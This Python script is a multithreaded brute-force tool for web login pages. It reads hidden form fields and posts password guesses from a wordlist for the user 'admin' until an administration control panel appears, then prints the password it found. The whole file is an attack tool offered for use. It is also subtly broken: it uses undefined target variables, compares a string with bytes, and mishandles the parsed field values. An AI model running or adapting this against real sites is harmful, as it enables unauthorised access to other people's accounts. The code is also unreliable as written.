#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

import urllib.parse
import urllib.request
import urllib.error

import http.cookiejar
import threading
import sys
import queue
from html.parser  import HTMLParser

user_thread = 10
username = "admin"
wordlist_file = "all.txt"

target = ""
post = ""

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: {!s}".format(username))


    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target= self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute =self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)

            page = response.read()
            print("Trying: {!s} : {!s} ({:d} left)".format(self.username,brute,self.password_q.qsize()))

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags).encode('utf-8')
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful")
                print("[*] Username: {!s}".format(username))
                print("[*] Password: {!s}".format(brute))
                print("[*] Waiting for other threads to exit ..")
                
            
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, val in attrs:
                if name == "name":
                    tag_name = val
                if name == "value":
                    tag_value = val
            if tag_name is not None:
                self.tag_results[tag_name] = val


                            
                
        
        
        
